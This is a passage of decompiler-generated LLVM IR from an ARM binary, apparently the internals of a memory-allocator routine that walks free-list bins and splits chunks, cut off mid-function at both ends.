  %v5_11f90 = add i32 %v4_11f88, %v4_11f90
  store i32 %v5_11f90, i32* %r1.global-to-local, align 4
  %v1_11f94 = add i32 %v5_11f90, 820
  %v2_11f94 = inttoptr i32 %v1_11f94 to i32*
  %v3_11f94 = load i32, i32* %v2_11f94, align 4
  %v1_11f98 = urem i32 %v0_11f98, 32
  store i32 %v1_11f98, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_11fa0 = shl i32 1, %v1_11f98
  %v8_11fa0 = or i32 %v3_11f94, %v7_11fa0
  store i32 %v8_11fa0, i32* %r3.global-to-local, align 4
  %v1_11fa4 = load i32, i32* @r6, align 4
  %v2_11fa4 = add i32 %v1_11fa4, 12
  %v3_11fa4 = inttoptr i32 %v2_11fa4 to i32*
  store i32 %v0_11fa4, i32* %v3_11fa4, align 4
  %v0_11fa8 = load i32, i32* @lr, align 4
  %v1_11fa8 = load i32, i32* @r6, align 4
  %v2_11fa8 = add i32 %v1_11fa8, 8
  %v3_11fa8 = inttoptr i32 %v2_11fa8 to i32*
  store i32 %v0_11fa8, i32* %v3_11fa8, align 4
  %v0_11fac = load i32, i32* %r3.global-to-local, align 4
  %v1_11fac = load i32, i32* %r1.global-to-local, align 4
  %v2_11fac = add i32 %v1_11fac, 820
  %v3_11fac = inttoptr i32 %v2_11fac to i32*
  store i32 %v0_11fac, i32* %v3_11fac, align 4
  %v0_11fb0 = load i32, i32* @r6, align 4
  %v1_11fb0 = load i32, i32* @lr, align 4
  %v2_11fb0 = add i32 %v1_11fb0, 12
  %v3_11fb0 = inttoptr i32 %v2_11fb0 to i32*
  store i32 %v0_11fb0, i32* %v3_11fb0, align 4
  %v0_11fb4 = load i32, i32* @r6, align 4
  %v1_11fb4 = load i32, i32* %ip.global-to-local, align 4
  %v2_11fb4 = add i32 %v1_11fb4, 8
  %v3_11fb4 = inttoptr i32 %v2_11fb4 to i32*
  store i32 %v0_11fb4, i32* %v3_11fb4, align 4
  %v0_11fd0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11fd0

dec_label_pc_11fbc:                               ; preds = %dec_label_pc_11e14, %dec_label_pc_11e5c, %dec_label_pc_11e70
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 126992, i32* %r1.global-to-local, align 4
  %v4_11fc4 = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_11fc4, i32* @sb, align 4
  %v0_11fc8 = load i32, i32* @sl, align 4
  %v1_11fc8 = add i32 %v0_11fc8, 16
  store i32 %v1_11fc8, i32* @fp, align 4
  %v1_11fcc = add i32 %v4_11fc4, 52
  store i32 %v1_11fcc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11fd0

dec_label_pc_11fd0:                               ; preds = %dec_label_pc_11f84, %dec_label_pc_11fbc
  %v0_11ef0 = phi i32 [ %v0_11fd0.pre, %dec_label_pc_11f84 ], [ %v1_11fcc, %dec_label_pc_11fbc ]
  %v1_11fd0 = add i32 %v0_11ef0, 12
  %v2_11fd0 = inttoptr i32 %v1_11fd0 to i32*
  %v3_11fd0 = load i32, i32* %v2_11fd0, align 4
  store i32 %v3_11fd0, i32* @r6, align 4
  %v9_11fd4 = icmp eq i32 %v3_11fd0, %v0_11ef0
  br i1 %v9_11fd4, label %dec_label_pc_11fdc, label %dec_label_pc_11e84

dec_label_pc_11fdc:                               ; preds = %dec_label_pc_11fd0
  %v0_11fdc = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_11fdc, 256
  %v0_12094.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_11fdc.dec_label_pc_12094_crit_edge, label %dec_label_pc_11fe4

dec_label_pc_11fdc.dec_label_pc_12094_crit_edge:  ; preds = %dec_label_pc_11fdc
  %.pre200 = mul i32 %v0_12094.pre, 8
  br label %dec_label_pc_12094

dec_label_pc_11fe4:                               ; preds = %dec_label_pc_11fdc
  %v4_11fe4 = mul i32 %v0_12094.pre, 8
  %v5_11fe4 = add i32 %v4_11fe4, %v0_11ef0
  store i32 %v5_11fe4, i32* %r3.global-to-local, align 4
  %v1_11fe8 = add i32 %v5_11fe4, -8
  store i32 %v1_11fe8, i32* %r1.global-to-local, align 4
  %v1_11fec = add i32 %v5_11fe4, 4
  %v2_11fec = inttoptr i32 %v1_11fec to i32*
  %storemerge.pre = load i32, i32* %v2_11fec, align 4
  br label %dec_label_pc_1208c

dec_label_pc_11ff4:                               ; preds = %dec_label_pc_1208c
  %v1_11ff4 = add i32 %v1_1201c, 4
  %v2_11ff4 = inttoptr i32 %v1_11ff4 to i32*
  %v3_11ff4 = load i32, i32* %v2_11ff4, align 4
  store i32 %v3_11ff4, i32* %r3.global-to-local, align 4
  %v1_11ff8 = and i32 %v3_11ff4, -4
  store i32 %v1_11ff8, i32* %r2.global-to-local, align 4
  %v3_11ffc = icmp ult i32 %v1_11ff8, %v0_11fdc
  %v1_12000 = add i32 %v1_1201c, 12
  %v2_12000 = inttoptr i32 %v1_12000 to i32*
  %v3_12000 = load i32, i32* %v2_12000, align 4
  store i32 %v3_12000, i32* %r0.global-to-local, align 4
  br i1 %v3_11ffc, label %dec_label_pc_1208c, label %dec_label_pc_12008

dec_label_pc_12008:                               ; preds = %dec_label_pc_11ff4
  %v1_12008 = add i32 %v1_1201c, 8
  %v2_12008 = inttoptr i32 %v1_12008 to i32*
  %v3_12008 = load i32, i32* %v2_12008, align 4
  store i32 %v3_12008, i32* %r1.global-to-local, align 4
  %v1_1200c = add i32 %v3_12008, 12
  %v2_1200c = inttoptr i32 %v1_1200c to i32*
  %v3_1200c = load i32, i32* %v2_1200c, align 4
  store i32 %v3_1200c, i32* %r3.global-to-local, align 4
  %v9_12010 = icmp eq i32 %v3_1200c, %v1_1201c
  br i1 %v9_12010, label %dec_label_pc_12018, label %dec_label_pc_12024

dec_label_pc_12018:                               ; preds = %dec_label_pc_12008
  %v1_12018 = add i32 %v3_12000, 8
  %v2_12018 = inttoptr i32 %v1_12018 to i32*
  %v3_12018 = load i32, i32* %v2_12018, align 4
  store i32 %v3_12018, i32* %r3.global-to-local, align 4
  %v9_1201c = icmp eq i32 %v3_12018, %v1_1201c
  br i1 %v9_1201c, label %dec_label_pc_12028, label %dec_label_pc_12024

dec_label_pc_12024:                               ; preds = %dec_label_pc_12008, %dec_label_pc_12018
  %v0_12024 = call i32 @function_1301c()
  store i32 %v0_12024, i32* %r0.global-to-local, align 4
  %v0_12028.pre = load i32, i32* @sl, align 4
  %v1_12028.pre = load i32, i32* @r2, align 4
  %v0_12030.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12028

dec_label_pc_12028:                               ; preds = %dec_label_pc_12018, %dec_label_pc_12024
  %v1_12030 = phi i32 [ %v3_12000, %dec_label_pc_12018 ], [ %v0_12024, %dec_label_pc_12024 ]
  %v0_12030 = phi i32 [ %v3_12008, %dec_label_pc_12018 ], [ %v0_12030.pre, %dec_label_pc_12024 ]
  %v1_12028 = phi i32 [ %v1_11ff8, %dec_label_pc_12018 ], [ %v1_12028.pre, %dec_label_pc_12024 ]
  %v0_12028 = phi i32 [ %v0_11fdc, %dec_label_pc_12018 ], [ %v0_12028.pre, %dec_label_pc_12024 ]
  %v2_12028 = sub i32 %v1_12028, %v0_12028
  store i32 %v2_12028, i32* %lr.global-to-local, align 4
  %v2_12030 = add i32 %v1_12030, 8
  %v3_12030 = inttoptr i32 %v2_12030 to i32*
  store i32 %v0_12030, i32* %v3_12030, align 4
  %v0_12034 = load i32, i32* %r0.global-to-local, align 4
  %v1_12034 = load i32, i32* %r1.global-to-local, align 4
  %v2_12034 = add i32 %v1_12034, 12
  %v3_12034 = inttoptr i32 %v2_12034 to i32*
  store i32 %v0_12034, i32* %v3_12034, align 4
  %v0_12038 = load i32, i32* %ip.global-to-local, align 4
  %v1_12038 = add i32 %v0_12038, 8
  store i32 %v1_12038, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_12028, 15
  br i1 %tmp207, label %dec_label_pc_12058, label %dec_label_pc_12040

dec_label_pc_12040:                               ; preds = %dec_label_pc_12028
  %v1_12040 = load i32, i32* %r2.global-to-local, align 4
  %v2_12040 = add i32 %v1_12040, %v0_12038
  store i32 %v2_12040, i32* %r2.global-to-local, align 4
  %v1_12044 = add i32 %v2_12040, 4
  %v2_12044 = inttoptr i32 %v1_12044 to i32*
  %v3_12044 = load i32, i32* %v2_12044, align 4
  store i32 %v3_12044, i32* %r3.global-to-local, align 4
  store i32 %v1_12038, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1204c

dec_label_pc_1204c.loopexit:                      ; preds = %dec_label_pc_11eec
  %v1_11ef8 = load i32, i32* @r6, align 4
  %v2_11ef8 = load i32, i32* @sl, align 4
  %v3_11ef8 = add i32 %v2_11ef8, %v1_11ef8
  store i32 %v3_11ef8, i32* %r2.global-to-local, align 4
  %v2_11efc = add i32 %v3_11ef8, 4
  %v3_11efc = inttoptr i32 %v2_11efc to i32*
  %v4_11efc = load i32, i32* %v3_11efc, align 4
  store i32 %v4_11efc, i32* %r3.global-to-local, align 4
  %v2_11f00 = add i32 %v1_11ef8, 8
  store i32 %v2_11f00, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1204c

dec_label_pc_1204c:                               ; preds = %.dec_label_pc_1204c_crit_edge, %dec_label_pc_1204c.loopexit, %dec_label_pc_12040
  %v1_12050 = phi i32 [ %v4_12174, %.dec_label_pc_1204c_crit_edge ], [ %v3_11ef8, %dec_label_pc_1204c.loopexit ], [ %v2_12040, %dec_label_pc_12040 ]
  %v0_1204c = phi i32 [ %v7_12174, %.dec_label_pc_1204c_crit_edge ], [ %v4_11efc, %dec_label_pc_1204c.loopexit ], [ %v3_12044, %dec_label_pc_12040 ]
  %v1_1204c = or i32 %v0_1204c, 1
  store i32 %v1_1204c, i32* %r3.global-to-local, align 4
  %v2_12050 = add i32 %v1_12050, 4
  %v3_12050 = inttoptr i32 %v2_12050 to i32*
  store i32 %v1_1204c, i32* %v3_12050, align 4
  br label %dec_label_pc_1260c

dec_label_pc_12058:                               ; preds = %dec_label_pc_12028
  %v1_12058 = load i32, i32* @sl, align 4
  %v2_12058 = add i32 %v1_12058, %v0_12038
  store i32 %v2_12058, i32* %r2.global-to-local, align 4
  %v1_1205c = or i32 %v1_12058, 1
  store i32 %v1_1205c, i32* %r3.global-to-local, align 4
  %v0_12060 = load i32, i32* %lr.global-to-local, align 4
  %v1_12060 = or i32 %v0_12060, 1
  store i32 %v1_12060, i32* %r1.global-to-local, align 4
  store i32 %v1_12038, i32* %r4.global-to-local, align 4
  %v2_12068 = add i32 %v0_12038, 4
  %v3_12068 = inttoptr i32 %v2_12068 to i32*
  store i32 %v1_1205c, i32* %v3_12068, align 4
  %v0_1206c = load i32, i32* %r2.global-to-local, align 4
  %v1_1206c = load i32, i32* @r6, align 4
  %v2_1206c = add i32 %v1_1206c, 8
  %v3_1206c = inttoptr i32 %v2_1206c to i32*
  store i32 %v0_1206c, i32* %v3_1206c, align 4
  %v0_12070 = load i32, i32* %r2.global-to-local, align 4
  %v1_12070 = load i32, i32* @r6, align 4
  %v2_12070 = add i32 %v1_12070, 12
  %v3_12070 = inttoptr i32 %v2_12070 to i32*
  store i32 %v0_12070, i32* %v3_12070, align 4
  %v0_12074 = load i32, i32* %lr.global-to-local, align 4
  %v1_12074 = load i32, i32* %r2.global-to-local, align 4
  %v3_12074 = add i32 %v1_12074, %v0_12074
  %v4_12074 = inttoptr i32 %v3_12074 to i32*
  store i32 %v0_12074, i32* %v4_12074, align 4
  %v0_12078 = load i32, i32* %r1.global-to-local, align 4
  %v1_12078 = load i32, i32* %r2.global-to-local, align 4
  %v2_12078 = add i32 %v1_12078, 4
  %v3_12078 = inttoptr i32 %v2_12078 to i32*
  store i32 %v0_12078, i32* %v3_12078, align 4
  %v0_1207c = load i32, i32* @r6, align 4
  %v1_1207c = load i32, i32* %r2.global-to-local, align 4
  %v2_1207c = add i32 %v1_1207c, 12
  %v3_1207c = inttoptr i32 %v2_1207c to i32*
  store i32 %v0_1207c, i32* %v3_1207c, align 4
  %v0_12080 = load i32, i32* @r6, align 4
  %v1_12080 = load i32, i32* %r2.global-to-local, align 4
  %v2_12080 = add i32 %v1_12080, 8
  %v3_12080 = inttoptr i32 %v2_12080 to i32*
  store i32 %v0_12080, i32* %v3_12080, align 4
  br label %dec_label_pc_1260c

dec_label_pc_1208c:                               ; preds = %dec_label_pc_11ff4, %dec_label_pc_11fe4
  %v1_1201c = phi i32 [ %storemerge.pre, %dec_label_pc_11fe4 ], [ %v3_12000, %dec_label_pc_11ff4 ]
  store i32 %v1_1201c, i32* %ip.global-to-local, align 4
  %v9_1208c = icmp eq i32 %v1_1201c, %v1_11fe8
  br i1 %v9_1208c, label %dec_label_pc_12094.loopexit, label %dec_label_pc_11ff4

dec_label_pc_12094.loopexit:                      ; preds = %dec_label_pc_1208c
  br label %dec_label_pc_12094

dec_label_pc_12094:                               ; preds = %dec_label_pc_11fdc.dec_label_pc_12094_crit_edge, %dec_label_pc_12094.loopexit
  %v4_120c4.pre-phi = phi i32 [ %.pre200, %dec_label_pc_11fdc.dec_label_pc_12094_crit_edge ], [ %v4_11fe4, %dec_label_pc_12094.loopexit ]
  %v1_12094 = add i32 %v0_12094.pre, 1
  store i32 %v1_12094, i32* %r2.global-to-local, align 4
  %v1_12098 = urem i32 %v1_12094, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 126992, i32* %r0.global-to-local, align 4
  %v6_120a4 = shl i32 1, %v1_12098
  store i32 %v6_120a4, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_120ac = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_120ac, i32* %r3.global-to-local, align 4
  %v3_120b0 = udiv i32 %v1_12094, 32
  store i32 %v3_120b0, i32* @r5, align 4
  %v4_120b4 = mul nuw nsw i32 %v3_120b0, 4
  %v5_120b4 = add i32 %v4_120ac, %v4_120b4
  store i32 %v5_120b4, i32* %r2.global-to-local, align 4
  %v1_120b8 = add i32 %v5_120b4, 820
  %v2_120b8 = inttoptr i32 %v1_120b8 to i32*
  %v3_120b8 = load i32, i32* %v2_120b8, align 4
  store i32 %v3_120b8, i32* @r4, align 4
  %v1_120bc = add i32 %v4_120ac, 52
  store i32 %v1_120bc, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_120c4 = add i32 %v1_120bc, %v4_120c4.pre-phi
  store i32 %v5_120c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_120c8

dec_label_pc_120c8:                               ; preds = %dec_label_pc_12130, %dec_label_pc_12094
  %v1_120d0 = phi i32 [ %v1_120d0.pre, %dec_label_pc_12130 ], [ %v3_120b8, %dec_label_pc_12094 ]
  %v0_120d0 = phi i32 [ %v0_120c8.pre, %dec_label_pc_12130 ], [ %v6_120a4, %dec_label_pc_12094 ]
  %v1_120c8 = sub i32 1, %v0_120d0
  %v2_120c8 = icmp ult i32 %v0_120d0, 2
  %v1_120c8. = select i1 %v2_120c8, i32 %v1_120c8, i32 0
  store i32 %v1_120c8., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_120d0, %v1_120d0
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_120c8
  %v5_120d4 = or i32 %v1_120c8., 1
  store i32 %v5_120d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_120e0.preheader

bb142:                                            ; preds = %dec_label_pc_120c8
  %v2_120d8 = icmp eq i32 %v1_120c8., 0
  br i1 %v2_120d8, label %.dec_label_pc_1211c.preheader_crit_edge, label %dec_label_pc_120e0.preheader

.dec_label_pc_1211c.preheader_crit_edge:          ; preds = %bb142
  %v0_1211454.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1211c.preheader

dec_label_pc_120e0.preheader:                     ; preds = %bb142, %.thread12
  %v0_120e0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_120e0

dec_label_pc_120e0:                               ; preds = %dec_label_pc_120e0.preheader, %dec_label_pc_120ec
  %v0_120e0 = phi i32 [ %v0_120e0.pre, %dec_label_pc_120e0.preheader ], [ %v1_120e0, %dec_label_pc_120ec ]
  %v1_120e0 = add i32 %v0_120e0, 1
  store i32 %v1_120e0, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_120e0, 2
  br i1 %tmp208, label %dec_label_pc_121c0.loopexit, label %dec_label_pc_120ec

dec_label_pc_120ec:                               ; preds = %dec_label_pc_120e0
  store i32 126992, i32* %r3.global-to-local, align 4
  %v1_120f0 = load i32, i32* @r8, align 4
  %v2_120f0 = add i32 %v1_120f0, 126992
  %v3_120f0 = inttoptr i32 %v2_120f0 to i32*
  %v4_120f0 = load i32, i32* %v3_120f0, align 4
  store i32 %v4_120f0, i32* %r2.global-to-local, align 4
  %v4_120f4 = mul i32 %v1_120e0, 4
  %v5_120f4 = add i32 %v4_120f0, %v4_120f4
  store i32 %v5_120f4, i32* %r3.global-to-local, align 4
  %v1_120f8 = add i32 %v5_120f4, 820
  %v2_120f8 = inttoptr i32 %v1_120f8 to i32*
  %v3_120f8 = load i32, i32* %v2_120f8, align 4
  store i32 %v3_120f8, i32* @r4, align 4
  %v2_120fc = icmp eq i32 %v3_120f8, 0
  br i1 %v2_120fc, label %dec_label_pc_120e0, label %dec_label_pc_12104

dec_label_pc_12104:                               ; preds = %dec_label_pc_120ec
  %v4_12104 = mul i32 %v1_120e0, 256
  %v5_12104 = add i32 %v4_120f0, %v4_12104
  store i32 %v5_12104, i32* %r3.global-to-local, align 4
  %v1_12108 = add i32 %v5_12104, 44
  store i32 %v1_12108, i32* %r0.global-to-local, align 4
  %v0_1210c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1210c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1211c.preheader

dec_label_pc_1211c.preheader:                     ; preds = %.dec_label_pc_1211c.preheader_crit_edge, %dec_label_pc_12104
  %v0_1211454 = phi i32 [ %v1_12108, %dec_label_pc_12104 ], [ %v0_1211454.pre, %.dec_label_pc_1211c.preheader_crit_edge ]
  %v0_12138 = phi i32 [ %v3_120f8, %dec_label_pc_12104 ], [ %v1_120d0, %.dec_label_pc_1211c.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_1210c, %dec_label_pc_12104 ], [ %v0_120d0, %.dec_label_pc_1211c.preheader_crit_edge ]
  %v2_1211c51 = and i32 %ip.promoted, %v0_12138
  %v4_1211c53 = icmp eq i32 %v2_1211c51, 0
  br i1 %v4_1211c53, label %dec_label_pc_12114, label %dec_label_pc_12124

dec_label_pc_12114:                               ; preds = %dec_label_pc_1211c.preheader, %dec_label_pc_12114
  %v2_1211856 = phi i32 [ %v2_12118, %dec_label_pc_12114 ], [ %ip.promoted, %dec_label_pc_1211c.preheader ]
  %v0_1211455 = phi i32 [ %v1_12114, %dec_label_pc_12114 ], [ %v0_1211454, %dec_label_pc_1211c.preheader ]
  %v1_12114 = add i32 %v0_1211455, 8
  %v2_12118 = mul i32 %v2_1211856, 2
  %v2_1211c = and i32 %v2_12118, %v0_12138
  %v4_1211c = icmp eq i32 %v2_1211c, 0
  br i1 %v4_1211c, label %dec_label_pc_12114, label %dec_label_pc_1211c.dec_label_pc_12124_crit_edge

dec_label_pc_1211c.dec_label_pc_12124_crit_edge:  ; preds = %dec_label_pc_12114
  store i32 %v1_12114, i32* %r0.global-to-local, align 4
  store i32 %v2_12118, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12124

dec_label_pc_12124:                               ; preds = %dec_label_pc_1211c.dec_label_pc_12124_crit_edge, %dec_label_pc_1211c.preheader
  %v0_12144 = phi i32 [ %v2_12118, %dec_label_pc_1211c.dec_label_pc_12124_crit_edge ], [ %ip.promoted, %dec_label_pc_1211c.preheader ]
  %v0_12168 = phi i32 [ %v1_12114, %dec_label_pc_1211c.dec_label_pc_12124_crit_edge ], [ %v0_1211454, %dec_label_pc_1211c.preheader ]
  %v1_12124 = add i32 %v0_12168, 12
  %v2_12124 = inttoptr i32 %v1_12124 to i32*
  %v3_12124 = load i32, i32* %v2_12124, align 4
  store i32 %v3_12124, i32* @lr, align 4
  %v9_12128 = icmp eq i32 %v3_12124, %v0_12168
  br i1 %v9_12128, label %dec_label_pc_12130, label %dec_label_pc_12150

dec_label_pc_12130:                               ; preds = %dec_label_pc_12124
  store i32 126992, i32* %r0.global-to-local, align 4
  %v1_12134 = load i32, i32* @r8, align 4
  %v2_12134 = add i32 %v1_12134, 126992
  %v3_12134 = inttoptr i32 %v2_12134 to i32*
  %v4_12134 = load i32, i32* %v3_12134, align 4
  %v2_12138 = sub i32 -1, %v0_12144
  %v3_12138 = and i32 %v0_12138, %v2_12138
  store i32 %v3_12138, i32* @r4, align 4
  %v1_1213c = load i32, i32* @r5, align 4
  %v4_1213c = mul i32 %v1_1213c, 4
  %v5_1213c = add i32 %v4_1213c, %v4_12134
  store i32 %v5_1213c, i32* %r3.global-to-local, align 4
  %v1_12140 = add i32 %v0_12168, 8
  store i32 %v1_12140, i32* %r0.global-to-local, align 4
  %v2_12144 = mul i32 %v0_12144, 2
  store i32 %v2_12144, i32* %ip.global-to-local, align 4
  %v2_12148 = add i32 %v5_1213c, 820
  %v3_12148 = inttoptr i32 %v2_12148 to i32*
  store i32 %v3_12138, i32* %v3_12148, align 4
  %v0_120c8.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_120d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_120c8

dec_label_pc_12150:                               ; preds = %dec_label_pc_12124
  %v1_12150 = add i32 %v3_12124, 4
  %v2_12150 = inttoptr i32 %v1_12150 to i32*
  %v3_12150 = load i32, i32* %v2_12150, align 4
  store i32 %v3_12150, i32* %r3.global-to-local, align 4
  %v1_12154 = and i32 %v3_12150, -4
  store i32 %v1_12154, i32* %r2.global-to-local, align 4
  %v0_12158 = load i32, i32* @sl, align 4
  %v2_12158 = sub i32 %v1_12154, %v0_12158
  store i32 %v2_12158, i32* %ip.global-to-local, align 4
  %v1_1215c = add i32 %v3_12124, 12
  %v2_1215c = inttoptr i32 %v1_1215c to i32*
  %v3_1215c = load i32, i32* %v2_1215c, align 4
  store i32 %v3_1215c, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_12158, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_12150
  %v6_12164 = add i32 %v1_12154, %v3_12124
  store i32 %v6_12164, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_12150, %bb143
  %v2_12168 = add i32 %v3_1215c, 8
  %v3_12168 = inttoptr i32 %v2_12168 to i32*
  store i32 %v0_12168, i32* %v3_12168, align 4
  %v0_1216c = load i32, i32* %r3.global-to-local, align 4
  %v1_1216c = load i32, i32* %r0.global-to-local, align 4
  %v2_1216c = add i32 %v1_1216c, 12
  %v3_1216c = inttoptr i32 %v2_1216c to i32*
  store i32 %v0_1216c, i32* %v3_1216c, align 4
  %v4_12170 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_1204c_crit_edge, label %dec_label_pc_1217c

.dec_label_pc_1204c_crit_edge:                    ; preds = %bb144
  %v5_12170 = add i32 %v4_12170, 8
  store i32 %v5_12170, i32* %r4.global-to-local, align 4
  %v4_12174 = load i32, i32* %r2.global-to-local, align 4
  %v5_12174 = add i32 %v4_12174, 4
  %v6_12174 = inttoptr i32 %v5_12174 to i32*
  %v7_12174 = load i32, i32* %v6_12174, align 4
  store i32 %v7_12174, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1204c

dec_label_pc_1217c:                               ; preds = %bb144
  %v1_1217c = load i32, i32* @sl, align 4
  %v2_1217c = add i32 %v1_1217c, %v4_12170
  store i32 %v2_1217c, i32* %r1.global-to-local, align 4
  %v1_12184 = load i32, i32* @r6, align 4
  %v2_12184 = add i32 %v1_12184, 8
  %v3_12184 = inttoptr i32 %v2_12184 to i32*
  store i32 %v2_1217c, i32* %v3_12184, align 4
  %v0_12188 = load i32, i32* %r1.global-to-local, align 4
  %v1_12188 = load i32, i32* @r6, align 4
  %v2_12188 = add i32 %v1_12188, 12
  %v3_12188 = inttoptr i32 %v2_12188 to i32*
  store i32 %v0_12188, i32* %v3_12188, align 4
  %v0_1218c = load i32, i32* @r6, align 4
  %v1_1218c = load i32, i32* %r1.global-to-local, align 4
  %v2_1218c = add i32 %v1_1218c, 8
  %v3_1218c = inttoptr i32 %v2_1218c to i32*
  store i32 %v0_1218c, i32* %v3_1218c, align 4
  %v0_12190 = load i32, i32* @r6, align 4
  %v1_12190 = load i32, i32* %r1.global-to-local, align 4
  %v2_12190 = add i32 %v1_12190, 12
  %v3_12190 = inttoptr i32 %v2_12190 to i32*
  store i32 %v0_12190, i32* %v3_12190, align 4
  %tmp210 = icmp ult i32 %v1_1217c, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_1217c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %r2.global-to-local, align 4
  %v8_1219c = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v8_1219c, i32* %r3.global-to-local, align 4
  %v4_121a0 = load i32, i32* %r1.global-to-local, align 4
  %v6_121a0 = add i32 %v8_1219c, 48
  %v7_121a0 = inttoptr i32 %v6_121a0 to i32*
  store i32 %v4_121a0, i32* %v7_121a0, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_1217c, %bb145
  %v0_121a4 = load i32, i32* @sl, align 4
  %v1_121a4 = or i32 %v0_121a4, 1
  store i32 %v1_121a4, i32* %r2.global-to-local, align 4
  %v0_121a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_121a8 = or i32 %v0_121a8, 1
  store i32 %v1_121a8, i32* %r3.global-to-local, align 4
  %v0_121ac = load i32, i32* @lr, align 4
  %v1_121ac = add i32 %v0_121ac, 8
  store i32 %v1_121ac, i32* %r4.global-to-local, align 4
  %v2_121b0 = add i32 %v0_121ac, 4
  %v3_121b0 = inttoptr i32 %v2_121b0 to i32*
  store i32 %v1_121a4, i32* %v3_121b0, align 4
  %v0_121b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_121b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_121b4 = add i32 %v1_121b4, %v0_121b4
  %v4_121b4 = inttoptr i32 %v3_121b4 to i32*
  store i32 %v0_121b4, i32* %v4_121b4, align 4
  %v0_121b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_121b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_121b8 = add i32 %v1_121b8, 4
  %v3_121b8 = inttoptr i32 %v2_121b8 to i32*
  store i32 %v0_121b8, i32* %v3_121b8, align 4
  br label %dec_label_pc_1260c

dec_label_pc_121c0.loopexit:                      ; preds = %dec_label_pc_120e0
  br label %dec_label_pc_121c0

dec_label_pc_121c0:                               ; preds = %dec_label_pc_121c0.loopexit, %dec_label_pc_11dd4, %dec_label_pc_11ddc
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %ip.global-to-local, align 4
  %v4_121c8 = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_121c8, i32* @r0, align 4
  %v1_121cc = add i32 %v4_121c8, 44
  %v2_121cc = inttoptr i32 %v1_121cc to i32*
  %v3_121cc = load i32, i32* %v2_121cc, align 4
  store i32 %v3_121cc, i32* %ip.global-to-local, align 4
  %v1_121d0 = add i32 %v3_121cc, 4
  %v2_121d0 = inttoptr i32 %v1_121d0 to i32*
  %v3_121d0 = load i32, i32* %v2_121d0, align 4
  %v0_121d4 = load i32, i32* @sl, align 4
  %v1_121d4 = add i32 %v0_121d4, 16
  store i32 %v1_121d4, i32* %r1.global-to-local, align 4
  %v1_121d8 = and i32 %v3_121d0, -4
  store i32 %v1_121d8, i32* %r3.global-to-local, align 4
  %v3_121dc = icmp ult i32 %v1_121d8, %v1_121d4
  br i1 %v3_121dc, label %dec_label_pc_1220c, label %dec_label_pc_121e8

dec_label_pc_121e8:                               ; preds = %dec_label_pc_121c0
  %v2_121e8 = sub i32 %v1_121d8, %v0_121d4
  %v2_121ec = add i32 %v0_121d4, %v3_121cc
  store i32 %v2_121ec, i32* %r1.global-to-local, align 4
  %v1_121f0 = or i32 %v2_121e8, 1
  store i32 %v1_121f0, i32* %r3.global-to-local, align 4
  %v1_121f4 = or i32 %v0_121d4, 1
  store i32 %v1_121f4, i32* %r2.global-to-local, align 4
  %v1_121f8 = add i32 %v3_121cc, 8
  store i32 %v1_121f8, i32* %r4.global-to-local, align 4
  store i32 %v1_121f4, i32* %v2_121d0, align 4
  %v0_12200 = load i32, i32* %r1.global-to-local, align 4
  %v1_12200 = load i32, i32* @r0, align 4
  %v2_12200 = add i32 %v1_12200, 44
  %v3_12200 = inttoptr i32 %v2_12200 to i32*
  store i32 %v0_12200, i32* %v3_12200, align 4
  %v0_12204 = load i32, i32* %r3.global-to-local, align 4
  %v1_12204 = load i32, i32* %r1.global-to-local, align 4
  %v2_12204 = add i32 %v1_12204, 4
  %v3_12204 = inttoptr i32 %v2_12204 to i32*
  store i32 %v0_12204, i32* %v3_12204, align 4
  br label %dec_label_pc_1260c

dec_label_pc_1220c:                               ; preds = %dec_label_pc_121c0
  %v1_1220c = inttoptr i32 %v4_121c8 to i32*
  %v2_1220c = load i32, i32* %v1_1220c, align 4
  store i32 %v2_1220c, i32* %r3.global-to-local, align 4
  %v1_12210 = and i32 %v2_1220c, 2
  store i32 %v1_12210, i32* %ip.global-to-local, align 4
